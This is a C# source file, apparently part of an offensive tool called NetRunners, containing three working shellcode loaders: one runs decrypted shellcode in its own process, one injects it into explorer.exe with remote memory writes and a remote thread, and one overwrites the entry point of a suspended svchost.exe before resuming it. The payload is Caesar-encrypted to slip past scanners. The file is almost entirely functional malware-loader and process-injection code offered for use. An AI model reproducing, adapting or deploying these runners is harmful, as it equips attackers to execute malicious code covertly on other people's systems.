using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using static NetRunners.Decryptors;
using static NetRunners.DLLImports;
using static NetRunners.Structures;

namespace NetRunners
{
    /// <summary>
    /// This class contains various shellcode runners.
    /// Retrieves encrypted payload from Shellcode class.
    /// Retrieves win32 apis from DLLImports class, retrieves needed structures from Structures class.
    /// </summary>
    class Runners
    {
        // Basic Reflective Runner
        public static void Runner()
        {
            // decrypt buf
            byte[] buf = CaesarDec();
            // define size of payload here
            int size = buf.Length;
            // call virtual alloc to allocate memory space here
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            // call copy function from interop to copy shellcode
            Marshal.Copy(buf, 0, addr, size);
            // call create thread function here to execute shellcode
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            // call wait function here
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }

        // Process Injection Runner
        public static void PiRunner()
        {
            // get explorer pid
            Process[] explorerProcesses = Process.GetProcessesByName("explorer");
            int explorerPID = explorerProcesses[0].Id;

            // get handle to explorer process 
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, explorerPID);
            // allocate memory on remote process
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
            // size of payload 
            IntPtr outSize;
            // decrypt buf
            byte[] buf = CaesarDec();
            // write to remote process memory
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
            // create remote thread to execute shellcode
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }

        // EntryPoint Stomping Runner (Special Thanks 2 cpu0x00!)
        public static void EpsRunner()
        {
            // instantiate structs
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            // create suspended svchost process
            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
            // fetch PEB address using zwqueryinfo
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
            // fetch address of the code base
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
            // parse PE header to locate entrypoint
            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
            // decrypt buf
            byte[] buf = CaesarDec();
            // write shellcode to memory
            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
            // resume thread
            ResumeThread(pi.hThread);
        }
    }
}
